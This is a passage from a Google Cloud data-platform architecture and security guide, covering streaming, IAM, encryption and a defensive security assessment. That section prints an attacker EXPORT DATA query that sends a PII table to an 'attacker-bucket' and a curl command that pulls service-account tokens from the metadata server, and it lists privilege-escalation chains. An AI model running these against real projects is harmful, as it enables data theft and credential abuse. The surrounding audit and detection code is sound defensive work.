                }
            }
        },
        {
            "pub_sub": {
                "topic": f"projects/{project}/topics/dlp-findings",
            }
        },
    ]

    job = dlp_client.create_dlp_job(
        request={
            "parent": f"projects/{project}/locations/global",
            "inspect_job": {
                "inspect_config": inspect_config,
                "storage_config": storage_config,
                "actions": actions,
            },
        }
    )
    return {"job_name": job.name, "state": job.state.name}


def deidentify_table(dataset_id: str, table_id: str):
    """Deidentify PII using multiple techniques."""
    deidentify_config = {
        "record_transformations": {
            "field_transformations": [
                {
                    # Crypto-hash emails (deterministic for joins)
                    "fields": [{"name": "email"}],
                    "primitive_transformation": {
                        "crypto_deterministic_config": {
                            "crypto_key": {
                                "kms_wrapped": {
                                    "wrapped_key": "BASE64_WRAPPED_KEY",
                                    "crypto_key_name": (
                                        "projects/my-project/locations/global/"
                                        "keyRings/dlp-ring/cryptoKeys/dlp-key"
                                    ),
                                }
                            },
                            "surrogate_info_type": {"name": "EMAIL_HASH"},
                        }
                    },
                },
                {
                    # Mask phone numbers
                    "fields": [{"name": "phone"}],
                    "primitive_transformation": {
                        "character_mask_config": {
                            "masking_character": "*",
                            "number_to_mask": 6,
                            "reverse_order": True,
                        }
                    },
                },
                {
                    # Generalize dates to month
                    "fields": [{"name": "birth_date"}],
                    "primitive_transformation": {
                        "date_shift_config": {
                            "upper_bound_days": 15,
                            "lower_bound_days": -15,
                            "context": {"name": "user_id"},
                            "crypto_key": {
                                "kms_wrapped": {
                                    "wrapped_key": "BASE64_WRAPPED_KEY",
                                    "crypto_key_name": (
                                        "projects/my-project/locations/global/"
                                        "keyRings/dlp-ring/cryptoKeys/dlp-key"
                                    ),
                                }
                            },
                        }
                    },
                },
            ]
        }
    }
    # Execute deidentification job...
```

### Dataplex

Dataplex organizes data into lakes, zones, and assets with automated data quality:

```hcl
resource "google_dataplex_lake" "analytics_lake" {
  location     = "us-central1"
  name         = "enterprise-analytics"
  display_name = "Enterprise Analytics Lake"
  project      = var.project_id

  labels = {
    environment = "production"
    team        = "data-engineering"
  }
}

resource "google_dataplex_zone" "raw_zone" {
  lake         = google_dataplex_lake.analytics_lake.name
  location     = "us-central1"
  name         = "raw-ingestion"
  display_name = "Raw Ingestion Zone"
  type         = "RAW"
  project      = var.project_id

  resource_spec {
    location_type = "SINGLE_REGION"
  }

  discovery_spec {
    enabled  = true
    schedule = "0 */6 * * *"  # Every 6 hours
    csv_options {
      delimiter = ","
      header_rows = 1
    }
  }
}

resource "google_dataplex_zone" "curated_zone" {
  lake         = google_dataplex_lake.analytics_lake.name
  location     = "us-central1"
  name         = "curated-analytics"
  display_name = "Curated Analytics Zone"
  type         = "CURATED"
  project      = var.project_id

  resource_spec {
    location_type = "SINGLE_REGION"
  }
}

resource "google_dataplex_asset" "bq_curated" {
  name         = "bigquery-analytics"
  location     = "us-central1"
  lake         = google_dataplex_lake.analytics_lake.name
  dataplex_zone = google_dataplex_zone.curated_zone.name
  project      = var.project_id

  resource_spec {
    name = "projects/${var.project_id}/datasets/analytics"
    type = "BIGQUERY_DATASET"
  }

  discovery_spec {
    enabled  = true
    schedule = "0 * * * *"
  }
}
```

### Analytics Hub

Analytics Hub enables secure data sharing across organizations:

```bash
# Create a data exchange
bq mk --data_exchange \
  --location=US \
  --display_name="Enterprise Data Exchange" \
  --description="Shared analytics datasets" \
  projects/my-project/locations/US/dataExchanges/enterprise_exchange

# Create a listing (shared dataset)
bq mk --listing \
  --data_exchange=projects/my-project/locations/US/dataExchanges/enterprise_exchange \
  --display_name="Customer Insights" \
  --source_dataset=projects/my-project/datasets/shared_insights \
  --description="Aggregated customer behavior data (no PII)" \
  projects/my-project/locations/US/dataExchanges/enterprise_exchange/listings/customer_insights

# Subscribe to a listing (consumer side)
bq mk --subscriber \
  --listing=projects/publisher/locations/US/dataExchanges/exchange/listings/listing \
  --destination_dataset=projects/consumer-project/datasets/subscribed_data
```

---

## 6. Streaming Architecture

### Pub/Sub Core Concepts

**Topics and Subscriptions:**

```hcl
resource "google_pubsub_topic" "events" {
  name    = "analytics-events"
  project = var.project_id

  schema_settings {
    schema   = google_pubsub_schema.event_schema.id
    encoding = "JSON"
  }

  message_retention_duration = "604800s"  # 7 days
}

resource "google_pubsub_schema" "event_schema" {
  name       = "analytics-event-schema"
  type       = "AVRO"
  definition = jsonencode({
    type = "record"
    name = "AnalyticsEvent"
    fields = [
      {name = "event_id", type = "string"},
      {name = "timestamp", type = "long"},
      {name = "user_id", type = "string"},
      {name = "event_type", type = "string"},
      {name = "properties", type = {type = "map", values = "string"}},
    ]
  })
}

resource "google_pubsub_subscription" "dataflow_sub" {
  name    = "events-dataflow-processing"
  topic   = google_pubsub_topic.events.name
  project = var.project_id

  ack_deadline_seconds       = 600
  message_retention_duration = "604800s"
  retain_acked_messages      = false
  enable_exactly_once_delivery = true

  expiration_policy {
    ttl = ""  # Never expire
  }

  retry_policy {
    minimum_backoff = "10s"
    maximum_backoff = "600s"
  }

  dead_letter_policy {
    dead_letter_topic     = google_pubsub_topic.dead_letter.id
    max_delivery_attempts = 10
  }
}

resource "google_pubsub_subscription" "bigquery_sub" {
  name    = "events-bigquery-direct"
  topic   = google_pubsub_topic.events.name
  project = var.project_id

  bigquery_config {
    table            = "${var.project_id}.streaming.raw_events"
    use_topic_schema = true
    write_metadata   = true
    drop_unknown_fields = true
  }
}
```

### Exactly-Once Delivery

Pub/Sub provides exactly-once delivery guarantees when:
1. `enable_exactly_once_delivery = true` on subscription
2. Client acknowledges with the correct `ack_id` before deadline
3. No duplicate publishing (use client-side deduplication or idempotent processing)

```python
from google.cloud import pubsub_v1
from concurrent.futures import TimeoutError
import json
import hashlib

subscriber = pubsub_v1.SubscriberClient()
subscription_path = subscriber.subscription_path(
    "my-project", "events-processing"
)


def process_message(message: pubsub_v1.subscriber.message.Message) -> None:
    """Process with exactly-once semantics."""
    try:
        data = json.loads(message.data.decode("utf-8"))
        event_id = data.get("event_id")

        # Idempotency check (application-level deduplication)
        if is_already_processed(event_id):
            message.ack()
            return

        # Process the event
        result = transform_and_store(data)

        # Mark as processed before ack
        mark_processed(event_id, result)

        # Acknowledge — exactly-once guarantees no re-delivery after ack
        message.ack()

    except Exception as e:
        # Nack for retry (respects retry_policy backoff)
        message.nack()
        log_processing_error(event_id, e)


streaming_pull_future = subscriber.subscribe(
    subscription_path,
    callback=process_message,
    flow_control=pubsub_v1.types.FlowControl(
        max_messages=100,
        max_bytes=10 * 1024 * 1024,  # 10 MB
    ),
)
```

### Ordering Keys

Ordering keys guarantee FIFO delivery for messages with the same key:

```python
from google.cloud import pubsub_v1

publisher = pubsub_v1.PublisherClient(
    publisher_options=pubsub_v1.types.PublisherOptions(
        enable_message_ordering=True,
    )
)
topic_path = publisher.topic_path("my-project", "ordered-events")


def publish_ordered_event(user_id: str, event: dict) -> str:
    """Publish with ordering key to guarantee per-user ordering."""
    data = json.dumps(event).encode("utf-8")

    future = publisher.publish(
        topic_path,
        data=data,
        ordering_key=user_id,  # All events for same user delivered in order
    )
    return future.result()
```

### Dataflow Streaming Pipeline

```python
def streaming_analytics_pipeline():
    """Real-time analytics with exactly-once BigQuery writes."""
    options = PipelineOptions(
        runner='DataflowRunner',
        project='my-project',
        region='us-central1',
        streaming=True,
        enable_streaming_engine=True,
        experiments=[
            'enable_streaming_engine',
            'use_runner_v2',
        ],
        temp_location='gs://dataflow-temp/tmp',
        num_workers=3,
        max_num_workers=30,
    )

    with beam.Pipeline(options=options) as p:
        events = (
            p
            | 'ReadPubSub' >> beam.io.ReadFromPubSub(
                subscription='projects/my-project/subscriptions/events-dataflow',
                timestamp_attribute='event_timestamp',
                with_attributes=True,
            )
            | 'DecodeAndParse' >> beam.Map(
                lambda msg: json.loads(msg.data.decode('utf-8'))
            )
        )

        # Real-time aggregation: 1-minute tumbling windows
        minute_aggregates = (
            events
            | 'ExtractMetrics' >> beam.Map(
                lambda e: (e['event_type'], 1)
            )
            | 'Window1Min' >> beam.WindowInto(
                window.FixedWindows(60),
                trigger=AfterWatermark(
                    early=AfterProcessingTime(10),
                ),
                accumulation_mode=AccumulationMode.ACCUMULATING,
            )
            | 'CountPerType' >> beam.CombinePerKey(sum)
            | 'FormatAggregate' >> beam.Map(format_aggregate)
        )

        # Write aggregates via Storage Write API (exactly-once)
        minute_aggregates | 'WriteAggregates' >> WriteToBigQuery(
            table='project:streaming.event_counts_1min',
            method=beam.io.WriteToBigQuery.Method.STORAGE_WRITE_API,
            triggering_frequency=10,  # seconds between flushes
        )

        # Write raw events with at-least-once for speed
        events | 'WriteRaw' >> WriteToBigQuery(
            table='project:streaming.raw_events',
            method=beam.io.WriteToBigQuery.Method.STREAMING_INSERTS,
            insert_retry_strategy='RETRY_ON_TRANSIENT_ERROR',
        )
```

### BigQuery Streaming Inserts (Direct)

For simple streaming without Dataflow:

```python
from google.cloud import bigquery
from google.api_core import retry
import time

client = bigquery.Client()
table_ref = client.dataset("streaming").table("events")


def stream_rows(rows: list[dict], max_retries: int = 3) -> list:
    """Stream rows to BigQuery with error handling."""
    errors = client.insert_rows_json(
        table_ref,
        rows,
        row_ids=[row.get("event_id", None) for row in rows],  # Dedup IDs
        retry=retry.Retry(deadline=30),
    )

    if errors:
        # Separate transient from permanent errors
        retriable = []
        permanent = []
        for error in errors:
            if any(
                e.get("reason") in ("backendError", "internalError")
                for e in error.get("errors", [])
            ):
                retriable.append(error)
            else:
                permanent.append(error)

        if permanent:
            send_to_dead_letter(permanent)

        if retriable and max_retries > 0:
            time.sleep(2 ** (3 - max_retries))
            stream_rows(
                [rows[e["index"]] for e in retriable],
                max_retries - 1,
            )

    return errors
```

### Pub/Sub Lite (Cost-Optimized)

Pub/Sub Lite provides zonal messaging at lower cost for high-volume, latency-tolerant workloads:

```hcl
resource "google_pubsub_lite_topic" "high_volume" {
  name    = "high-volume-telemetry"
  project = var.project_id

  partition_config {
    count = 8  # Manual partition management

    capacity {
      publish_mib_per_sec  = 16
      subscribe_mib_per_sec = 32
    }
  }

  retention_config {
    per_partition_bytes = 32212254720  # 30 GiB per partition
    period             = "604800s"     # 7 days
  }

  reservation_config {
    throughput_reservation = google_pubsub_lite_reservation.telemetry.name
  }
}

resource "google_pubsub_lite_reservation" "telemetry" {
  name                = "telemetry-reservation"
  project             = var.project_id
  region              = "us-central1"
  throughput_capacity = 10  # Units of 1 MiB/s publish + 2 MiB/s subscribe
}
```

Key differences from standard Pub/Sub:
- Zonal (not global) — single zone availability
- Pre-provisioned throughput and storage capacity
- Manual partition count (no auto-scaling of partitions)
- 3-5x cheaper for sustained high throughput
- Supports Dataflow and Spark as consumers

### Eventarc (Event-Driven Patterns)

```hcl
resource "google_eventarc_trigger" "gcs_to_workflow" {
  name     = "new-data-file-trigger"
  location = "us-central1"
  project  = var.project_id

  matching_criteria {
    attribute = "type"
    value     = "google.cloud.storage.object.v1.finalized"
  }

  matching_criteria {
    attribute = "bucket"
    value     = google_storage_bucket.landing_zone.name
  }

  destination {
    workflow = google_workflows_workflow.data_pipeline.id
  }

  service_account = google_service_account.eventarc_sa.email
}

resource "google_eventarc_trigger" "bigquery_job_complete" {
  name     = "bq-job-complete-trigger"
  location = "us-central1"
  project  = var.project_id

  matching_criteria {
    attribute = "type"
    value     = "google.cloud.bigquery.job.v1.completed"
  }

  matching_criteria {
    attribute = "serviceName"
    value     = "bigquery.googleapis.com"
  }

  destination {
    cloud_run_service {
      service = google_cloud_run_service.post_processor.name
      region  = "us-central1"
    }
  }

  service_account = google_service_account.eventarc_sa.email
}
```

---

## 7. Security Architecture

### IAM and Resource Hierarchy

GCP's resource hierarchy determines IAM inheritance:

```
Organization (org policies, org-level IAM)
  └── Folder (department/team grouping)
       └── Project (billing boundary, service enablement)
            └── Resources (BigQuery datasets, GCS buckets, etc.)
```

**Data-specific IAM roles:**

| Role | Scope | Grants |
|------|-------|--------|
| `roles/bigquery.dataViewer` | Dataset/Table | Read table data, list tables |
| `roles/bigquery.dataEditor` | Dataset/Table | Read + write + delete data |
| `roles/bigquery.dataOwner` | Dataset | Full control including sharing |
| `roles/bigquery.jobUser` | Project | Run queries (no data access) |
| `roles/bigquery.admin` | Project | Full BQ control |
| `roles/storage.objectViewer` | Bucket | Read objects |
| `roles/storage.objectCreator` | Bucket | Write objects (no read/delete) |
| `roles/storage.admin` | Bucket/Project | Full storage control |
| `roles/pubsub.publisher` | Topic | Publish messages |
| `roles/pubsub.subscriber` | Subscription | Consume messages |

**Best practices for data platform IAM:**

```hcl
# Dataset-level IAM (prefer over project-level)
resource "google_bigquery_dataset_iam_binding" "analysts_read" {
  dataset_id = google_bigquery_dataset.analytics.dataset_id
  role       = "roles/bigquery.dataViewer"
  members = [
    "group:data-analysts@company.com",
  ]
}

# Authorized views (row/column filtering without direct table access)
resource "google_bigquery_dataset_access" "authorized_view" {
  dataset_id = google_bigquery_dataset.raw_data.dataset_id
  view {
    project_id = var.project_id
    dataset_id = google_bigquery_dataset.views.dataset_id
    table_id   = google_bigquery_table.filtered_view.table_id
  }
}

# Custom role for specific data pipeline needs
resource "google_project_iam_custom_role" "data_pipeline" {
  role_id     = "dataPipelineWorker"
  title       = "Data Pipeline Worker"
  description = "Minimal permissions for data pipeline execution"
  permissions = [
    "bigquery.tables.getData",
    "bigquery.tables.updateData",
    "bigquery.jobs.create",
    "storage.objects.get",
    "storage.objects.list",
    "storage.objects.create",
    "pubsub.subscriptions.consume",
    "pubsub.topics.publish",
  ]
}
```

### VPC Service Controls

VPC Service Controls create security perimeters that prevent data exfiltration:

```hcl
resource "google_access_context_manager_service_perimeter" "data_perimeter" {
  parent = "accessPolicies/${var.access_policy_id}"
  name   = "accessPolicies/${var.access_policy_id}/servicePerimeters/data_platform"
  title  = "Data Platform Perimeter"

  status {
    resources = [
      "projects/${var.data_project_number}",
      "projects/${var.analytics_project_number}",
    ]

    restricted_services = [
      "bigquery.googleapis.com",
      "storage.googleapis.com",
      "pubsub.googleapis.com",
      "dataflow.googleapis.com",
      "datacatalog.googleapis.com",
      "dlp.googleapis.com",
    ]

    # Access levels for permitted access
    access_levels = [
      google_access_context_manager_access_level.corp_network.name,
      google_access_context_manager_access_level.trusted_identities.name,
    ]

    # Ingress: allow specific external access patterns
    ingress_policies {
      ingress_from {
        identity_type = "ANY_IDENTITY"
        sources {
          access_level = google_access_context_manager_access_level.corp_network.name
        }
      }
      ingress_to {
        resources = ["projects/${var.data_project_number}"]
        operations {
          service_name = "bigquery.googleapis.com"
          method_selectors {
            method = "google.cloud.bigquery.v2.JobService.InsertJob"
          }
          method_selectors {
            method = "google.cloud.bigquery.v2.TableDataService.List"
          }
        }
      }
    }

    # Egress: restrict data export destinations
    egress_policies {
      egress_from {
        identities = [
          "serviceAccount:${google_service_account.export_sa.email}",
        ]
      }
      egress_to {
        resources = ["projects/${var.approved_export_project_number}"]
        operations {
          service_name = "storage.googleapis.com"
          method_selectors {
            method = "google.storage.objects.create"
          }
        }
      }
    }

    vpc_accessible_services {
      enable_restriction = true
      allowed_services = [
        "bigquery.googleapis.com",
        "storage.googleapis.com",
        "pubsub.googleapis.com",
      ]
    }
  }
}

resource "google_access_context_manager_access_level" "corp_network" {
  parent = "accessPolicies/${var.access_policy_id}"
  name   = "accessPolicies/${var.access_policy_id}/accessLevels/corp_network"
  title  = "Corporate Network"

  basic {
    conditions {
      ip_subnetworks = [
        "203.0.113.0/24",    # Corporate egress
        "198.51.100.0/24",   # VPN egress
      ]
      required_access_levels = []
    }
  }
}
```

### Customer-Managed Encryption Keys (CMEK)

```hcl
# KMS keyring and key for data platform
resource "google_kms_key_ring" "data_platform" {
  name     = "data-platform-keyring"
  location = "us-central1"
  project  = var.security_project_id
}

resource "google_kms_crypto_key" "bigquery" {
  name            = "bigquery-encryption-key"
  key_ring        = google_kms_key_ring.data_platform.id
  rotation_period = "7776000s"  # 90 days
  purpose         = "ENCRYPT_DECRYPT"

  version_template {
    algorithm        = "GOOGLE_SYMMETRIC_ENCRYPTION"
    protection_level = "HSM"  # Hardware Security Module
  }

  lifecycle {
    prevent_destroy = true
  }
}

resource "google_kms_crypto_key" "storage" {
  name            = "storage-encryption-key"
  key_ring        = google_kms_key_ring.data_platform.id
  rotation_period = "7776000s"
  purpose         = "ENCRYPT_DECRYPT"

  version_template {
    algorithm        = "GOOGLE_SYMMETRIC_ENCRYPTION"
    protection_level = "HSM"
  }
}

# Grant BigQuery service account access to the key
resource "google_kms_crypto_key_iam_member" "bigquery_encrypt" {
  crypto_key_id = google_kms_crypto_key.bigquery.id
  role          = "roles/cloudkms.cryptoKeyEncrypterDecrypter"
  member        = "serviceAccount:bq-${var.data_project_number}@bigquery-encryption.iam.gserviceaccount.com"
}

# BigQuery dataset with CMEK
resource "google_bigquery_dataset" "encrypted_analytics" {
  dataset_id                 = "encrypted_analytics"
  location                   = "us-central1"
  default_encryption_configuration {
    kms_key_name = google_kms_crypto_key.bigquery.id
  }
}

# Cloud Storage bucket with CMEK
resource "google_storage_bucket" "encrypted_lake" {
  name     = "encrypted-data-lake"
  location = "US-CENTRAL1"

  encryption {
    default_kms_key_name = google_kms_crypto_key.storage.id
  }
}
```

### Access Transparency

Access Transparency logs provide visibility into Google personnel access to your data:

```bash
# View Access Transparency logs
gcloud logging read \
  'logName="projects/my-project/logs/cloudaudit.googleapis.com%2Faccess_transparency"' \
  --format=json \
  --freshness=7d
```

Access Transparency logs include:
- Justification (support case, internal automation, etc.)
- Resource accessed
- Time and duration
- Google personnel identifier (obfuscated)

### Binary Authorization for Dataproc

```hcl
resource "google_binary_authorization_policy" "dataproc_policy" {
  project = var.project_id

  global_policy_evaluation_mode = "ENABLE"

  default_admission_rule {
    evaluation_mode  = "REQUIRE_ATTESTATION"
    enforcement_mode = "ENFORCED_BLOCK_AND_AUDIT_LOG"
    require_attestations_by = [
      google_binary_authorization_attestor.build_attestor.name,
    ]
  }

  cluster_admission_rules {
    cluster = "us-central1-a.dataproc-secure-cluster"
    evaluation_mode  = "REQUIRE_ATTESTATION"
    enforcement_mode = "ENFORCED_BLOCK_AND_AUDIT_LOG"
    require_attestations_by = [
      google_binary_authorization_attestor.build_attestor.name,
    ]
  }
}
```

### Organization Policies for Data Services

```hcl
# Restrict BigQuery export destinations
resource "google_org_policy_policy" "restrict_bq_export" {
  name   = "projects/${var.project_id}/policies/constraints/bigquery.restrictExportDataConfig"
  parent = "projects/${var.project_id}"

  spec {
    rules {
      values {
        allowed_values = [
          "projects/${var.approved_project_id}",
        ]
      }
    }
  }
}

# Require CMEK for BigQuery
resource "google_org_policy_policy" "require_cmek_bq" {
  name   = "projects/${var.project_id}/policies/constraints/bigquery.requireCmek"
  parent = "projects/${var.project_id}"

  spec {
    rules {
      enforce = "TRUE"
    }
  }
}

# Disable public access to Cloud Storage
resource "google_org_policy_policy" "no_public_storage" {
  name   = "projects/${var.project_id}/policies/constraints/storage.publicAccessPrevention"
  parent = "projects/${var.project_id}"

  spec {
    rules {
      enforce = "TRUE"
    }
  }
}

# Restrict service account key creation
resource "google_org_policy_policy" "disable_sa_keys" {
  name   = "projects/${var.project_id}/policies/constraints/iam.disableServiceAccountKeyCreation"
  parent = "projects/${var.project_id}"

  spec {
    rules {
      enforce = "TRUE"
    }
  }
}
```

---

## 8. Security Assessment

### BigQuery Shared Dataset Exposure

**Attack scenario:** Overly permissive dataset sharing exposes sensitive data to unintended audiences.

**Assessment methodology:**

```python
from google.cloud import bigquery
from google.cloud import asset_v1

def audit_bigquery_access(project_id: str) -> list[dict]:
    """Audit BigQuery dataset access for oversharing."""
    client = bigquery.Client(project=project_id)
    findings = []

    for dataset in client.list_datasets():
        dataset_ref = client.get_dataset(dataset.dataset_id)
        access_entries = dataset_ref.access_entries

        for entry in access_entries:
            # Flag allAuthenticatedUsers or allUsers
            if entry.entity_id in ("allAuthenticatedUsers", "allUsers"):
                findings.append({
                    "severity": "CRITICAL",
                    "dataset": dataset.dataset_id,
                    "entity": entry.entity_id,
                    "role": entry.role,
                    "finding": "Dataset publicly accessible",
                    "cwe": "CWE-732",
                })

            # Flag domain-wide access without restriction
            if entry.entity_type == "domain":
                findings.append({
                    "severity": "HIGH",
                    "dataset": dataset.dataset_id,
                    "entity": f"domain:{entry.entity_id}",
                    "role": entry.role,
                    "finding": "Domain-wide access (entire org can access)",
                })

            # Flag service accounts from other projects
            if (
                entry.entity_type == "userByEmail"
                and entry.entity_id.endswith(".iam.gserviceaccount.com")
                and project_id not in entry.entity_id
            ):
                findings.append({
                    "severity": "MEDIUM",
                    "dataset": dataset.dataset_id,
                    "entity": entry.entity_id,
                    "role": entry.role,
                    "finding": "Cross-project service account access",
                })

    return findings
```

### Exfiltration via EXPORT DATA

**Attack vector:** A compromised service account or malicious insider uses `EXPORT DATA` to extract data to an external project or public bucket.

```sql
-- Attacker query (if they have bigquery.jobs.create + data read):
EXPORT DATA OPTIONS (
  uri='gs://attacker-bucket/exfil/*.csv',
  format='CSV',
  overwrite=true
) AS
SELECT * FROM `victim-project.sensitive_dataset.pii_table`;
```

**Defenses:**

1. VPC Service Controls (block egress to unauthorized projects)
2. Organization policy `constraints/bigquery.restrictExportDataConfig`
3. Audit log monitoring for EXPORT DATA operations
4. Remove `bigquery.jobs.create` from untrusted identities

```python
def detect_export_data_exfiltration(project_id: str, hours_back: int = 24):
    """Detect potential data exfiltration via EXPORT DATA."""
    from google.cloud import logging_v2
    from datetime import datetime, timedelta, timezone

    client = logging_v2.Client(project=project_id)
    cutoff = datetime.now(timezone.utc) - timedelta(hours=hours_back)

    filter_str = (
        f'resource.type="bigquery_project" '
        f'protoPayload.methodName="jobservice.jobcompleted" '
        f'protoPayload.serviceData.jobCompletedEvent.job.jobConfiguration.'
        f'extract.destinationUris:* '
        f'timestamp>="{cutoff.isoformat()}"'
    )

    alerts = []
    for entry in client.list_entries(filter_=filter_str):
        job_config = (
            entry.payload.get("serviceData", {})
            .get("jobCompletedEvent", {})
            .get("job", {})
            .get("jobConfiguration", {})
        )
        extract_config = job_config.get("extract", {})
        dest_uris = extract_config.get("destinationUris", [])

        for uri in dest_uris:
            # Flag exports to buckets outside our org
            if not uri.startswith(f"gs://{project_id}"):
                alerts.append({
                    "severity": "HIGH",
                    "timestamp": entry.timestamp.isoformat(),
                    "principal": entry.payload.get("authenticationInfo", {}).get(
                        "principalEmail"
                    ),
                    "destination": uri,
                    "source_tables": extract_config.get("sourceTable", {}),
                    "finding": "Data exported to external bucket",
                })

    return alerts
```

### Cloud Storage Misconfigurations

**Common exposure vectors:**

1. **Uniform bucket-level access disabled** — legacy ACLs on individual objects
2. **Public access** — `allUsers` or `allAuthenticatedUsers` IAM bindings
3. **Signed URL abuse** — long-lived signed URLs leaked
4. **CORS misconfiguration** — wildcard origins enabling browser-based exfil

```bash
# Audit public buckets in project
gcloud asset search-all-iam-policies \
  --scope=projects/my-project \
  --query="policy:allUsers OR policy:allAuthenticatedUsers" \
  --asset-types=storage.googleapis.com/Bucket \
  --format="table(resource, policy.bindings.role, policy.bindings.members)"

# Check for uniform bucket-level access
gcloud storage buckets describe gs://my-bucket \
  --format="value(iamConfiguration.uniformBucketLevelAccess.enabled)"

# Enumerate CORS policies
gcloud storage buckets describe gs://my-bucket \
  --format="json(cors)"
```

### Service Account Key Leakage

**Risk:** Exported service account keys provide persistent access without MFA, IP restriction, or session expiry.

```python
def audit_service_account_keys(project_id: str) -> list[dict]:
    """Find service account keys that should not exist."""
    from google.cloud import iam_admin_v1
    from datetime import datetime, timezone

    client = iam_admin_v1.IAMClient()
    findings = []
    now = datetime.now(timezone.utc)

    # List all service accounts
    request = iam_admin_v1.ListServiceAccountsRequest(
        name=f"projects/{project_id}"
    )
    for sa in client.list_service_accounts(request=request):
        # List keys for each SA
        key_request = iam_admin_v1.ListServiceAccountKeysRequest(
            name=sa.name,
            key_types=[iam_admin_v1.ListServiceAccountKeysRequest.KeyType.USER_MANAGED],
        )
        keys = client.list_service_account_keys(request=key_request)

        for key in keys.keys:
            key_age_days = (now - key.valid_after_time).days

            if key_age_days > 90:
                findings.append({
                    "severity": "HIGH",
                    "service_account": sa.email,
                    "key_id": key.name.split("/")[-1],
                    "age_days": key_age_days,
                    "finding": "Service account key older than 90 days",
                    "remediation": "Rotate key or migrate to Workload Identity",
                })

            # Check if SA has high-privilege roles
            roles = get_sa_roles(project_id, sa.email)
            privileged_roles = [
                r for r in roles
                if any(p in r for p in ["admin", "owner", "editor"])
            ]
            if privileged_roles and key_age_days > 0:
                findings.append({
                    "severity": "CRITICAL",
                    "service_account": sa.email,
                    "key_id": key.name.split("/")[-1],
                    "roles": privileged_roles,
                    "finding": "Privileged SA with exported key",
                    "remediation": "Remove key, use Workload Identity Federation",
                })

    return findings
```

### Dataproc Cluster Escape

**Attack vectors on managed Spark/Hadoop clusters:**

1. **Metadata server access** — Worker VMs can reach `169.254.169.254` to obtain service account tokens
2. **Init actions** — Arbitrary code execution during cluster startup
3. **YARN container escape** — Breaking out of container isolation to node level
4. **GCS connector credentials** — Accessing the Hadoop credential provider for GCS

**Mitigations:**

```hcl
resource "google_dataproc_cluster" "secure_cluster" {
  name    = "secure-analytics"
  region  = "us-central1"
  project = var.project_id

  cluster_config {
    gce_cluster_config {
      # Disable external IPs
      internal_ip_only = true

      # Minimal service account
      service_account = google_service_account.dataproc_worker.email
      service_account_scopes = [
        "https://www.googleapis.com/auth/cloud-platform",
      ]

      # Network isolation
      subnetwork = google_compute_subnetwork.dataproc_subnet.self_link

      # Metadata to block metadata server abuse
      metadata = {
        "enable-oslogin" = "true"
        # Block legacy metadata endpoints
        "block-project-ssh-keys" = "true"
      }

      shielded_instance_config {
        enable_secure_boot          = true
        enable_vtpm                 = true
        enable_integrity_monitoring = true
      }
    }

    # Kerberos for YARN authentication
    security_config {
      kerberos_config {
        enable_kerberos                = true
        kms_key_uri                   = google_kms_crypto_key.dataproc.id
        root_principal_password_uri    = "gs://secure-config/kerberos-password.encrypted"
      }
    }

    # CMEK for cluster disks
    encryption_config {
      gce_pd_kms_key_name = google_kms_crypto_key.dataproc.id
    }

    software_config {
      image_version = "2.1-debian11"
      properties = {
        # Restrict YARN container capabilities
        "yarn:yarn.nodemanager.linux-container-executor.group"         = "yarn"
        "yarn:yarn.nodemanager.runtime.linux.docker.privileged-containers.acl" = ""
        # Disable web UIs on workers
        "spark:spark.ui.enabled" = "false"
      }
    }
  }
}
```

### Metadata Server Exploitation

On GCP VMs (including Dataproc workers, Dataflow workers, Composer workers):

```bash
# Attacker on compromised worker VM:
curl -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Returns access token with all scopes granted to the VM's service account
```

**Defense:** Minimize SA permissions + VPC Service Controls (token useless outside perimeter) + Workload Identity (per-pod identity vs per-node).

### IAM Privilege Escalation Paths

Common escalation chains in GCP data services:

1. `iam.serviceAccounts.actAs` on a privileged SA → launch BigQuery job as that SA
2. `bigquery.jobs.create` + `bigquery.tables.getData` → exfiltrate any readable table
3. `storage.objects.create` on a Composer DAGs bucket → inject arbitrary Airflow DAG → execute as Composer SA
4. `dataproc.clusters.create` with custom init actions → execute arbitrary code as Dataproc SA
5. `cloudfunctions.functions.create` + `iam.serviceAccounts.actAs` → deploy function as privileged SA

```python
def check_escalation_paths(project_id: str, identity: str) -> list[dict]:
    """Check for IAM privilege escalation paths."""
    from google.cloud import asset_v1

    client = asset_v1.AssetServiceClient()
    escalation_paths = []

    # Check if identity can actAs any service account
    request = asset_v1.AnalyzeIamPolicyRequest(
        analysis_query=asset_v1.IamPolicyAnalysisQuery(
            scope=f"projects/{project_id}",
            identity_selector=asset_v1.IamPolicyAnalysisQuery.IdentitySelector(
                identity=identity
            ),
            access_selector=asset_v1.IamPolicyAnalysisQuery.AccessSelector(
                permissions=["iam.serviceAccounts.actAs"]
            ),
        )
    )

    response = client.analyze_iam_policy(request=request)

    for result in response.main_analysis.analysis_results:
        target_sa = result.attached_resource_full_name
        escalation_paths.append({
            "from": identity,
            "permission": "iam.serviceAccounts.actAs",
            "target": target_sa,
            "severity": "HIGH",
            "note": "Can impersonate this SA via job/function creation",
        })

    # Check for Composer DAG bucket write access
    # (enables arbitrary code execution as Composer SA)
    request2 = asset_v1.AnalyzeIamPolicyRequest(
        analysis_query=asset_v1.IamPolicyAnalysisQuery(
            scope=f"projects/{project_id}",
            identity_selector=asset_v1.IamPolicyAnalysisQuery.IdentitySelector(
                identity=identity
            ),
            access_selector=asset_v1.IamPolicyAnalysisQuery.AccessSelector(
                permissions=["storage.objects.create"],
                resources=[f"//storage.googleapis.com/{project_id}-composer-dags"],
            ),
        )
    )

    # ... similar analysis for other escalation vectors

    return escalation_paths
```

---

## 9. Monitoring and Compliance

### Cloud Audit Logs

GCP generates three types of audit logs for data services:

**Admin Activity** (always on, free):
- Dataset creation/deletion
- IAM policy changes
- Table schema modifications
- Bucket creation and configuration changes

**Data Access** (must be enabled, billable):
- BigQuery query execution (which tables read)
- Cloud Storage object access
- Pub/Sub message consumption
- Must be explicitly enabled per service

**System Event** (always on, free):
- Automatic key rotation
- Lifecycle management actions
- GCP-initiated maintenance

```hcl
# Enable Data Access audit logs for critical services
resource "google_project_iam_audit_config" "bigquery_audit" {
  project = var.project_id
  service = "bigquery.googleapis.com"

  audit_log_config {
    log_type = "DATA_READ"
  }
  audit_log_config {
    log_type = "DATA_WRITE"
  }
}

resource "google_project_iam_audit_config" "storage_audit" {
  project = var.project_id
  service = "storage.googleapis.com"

  audit_log_config {
    log_type = "DATA_READ"
  }
  audit_log_config {
    log_type = "DATA_WRITE"
  }
}

# Log sink to BigQuery for analysis
resource "google_logging_project_sink" "audit_to_bq" {
  name        = "audit-logs-to-bigquery"
  project     = var.project_id
